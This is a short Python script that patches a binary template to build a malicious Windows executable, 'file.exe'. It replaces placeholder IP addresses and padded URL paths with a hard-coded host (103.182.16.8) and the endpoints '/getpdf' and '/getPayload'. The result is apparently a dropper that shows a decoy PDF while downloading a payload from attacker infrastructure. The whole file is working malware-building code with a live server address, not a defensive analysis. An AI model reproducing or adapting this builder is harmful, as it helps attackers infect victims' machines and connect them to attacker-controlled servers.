import re
class ChangeUrl:
    def __init__(self,template_path="template") :
        self.template_path = template_path
        self.notFail = True
        print("NOTE: Port communication default 8082")
        # check file exist
        try:
            print("Read file template")
            with open(self.template_path,"rb") as f:
                self.template = f.read()
            print("Read file template success")
        except Exception as e:
            self.notFail = False
            print("File template not found")
            return

    def replace_string(self,string: str,replace_string: str):
        if len(string) < len(replace_string):
            print("Fail: String too long")
            return False
        string_encode=string.encode('utf-16le')
        if string_encode in self.template:
            print(f'Found string {string} in the file')
        else:
            print(f'Could not find string {string} in the file')
            self.notFail = False
            return False
        # encode url path and add byte \x00
        replace_string_encode = replace_string.encode('utf-16le')
        replace_string_encode=replace_string_encode+(len(string_encode)-len(replace_string_encode))*b"\x00"
        # replace string with url path
        print("Insert string:",replace_string)
        self.template = self.template.replace(string_encode, replace_string_encode)
        return True

    def pdf_change_host(self,host: str="103.182.16.8"):            
        string ="255.255.255.255"
        if self.replace_string(string,host) == False:
            print("Fail: Change host pdf")
            return
        print("Success: Change host pdf")

    def pdf_change_path_url(self,url_path: str="/getpdf"):            
        string ="/getpdfgetpdfgetpdfgetpdfgetpdfgetpdfgetpdfgetpdfgetpdfgetpdf"
        if self.replace_string(string,url_path) == False:
            print("Fail: Change path url pdf")
            return
        print("Success: Change path url pdf")

    def payload_change_host(self,host: str="103.182.16.8"):  
        string="254.254.254.254"
        if self.replace_string(string,host) == False:
            print("Fail: Change host payload")
            return
        print("Success: Change host payload")

    def payload_change_path_url(self,url_path: str="/getPayload"):
        string ="/getPayloadgetPayloadgetPayloadgetPayloadgetPayloadgetPayload"
        if self.replace_string(string,url_path) == False:
            print("Fail: Change path url payload")
            return
        print("Success: Change path url payload")

    def writeToFile(self,file_save="file.exe"):
        if self.notFail == False:
            print("Fail: Write to file")
            return
           # write to file
        print("Write output file:",file_save)
        with open(file_save, "wb") as f:
            f.write(self.template)


changeurl=ChangeUrl()
changeurl.payload_change_host("103.182.16.8")
changeurl.payload_change_path_url("/getPayload")
changeurl.pdf_change_host("103.182.16.8")
changeurl.pdf_change_path_url("/getpdf")
changeurl.writeToFile("file.exe")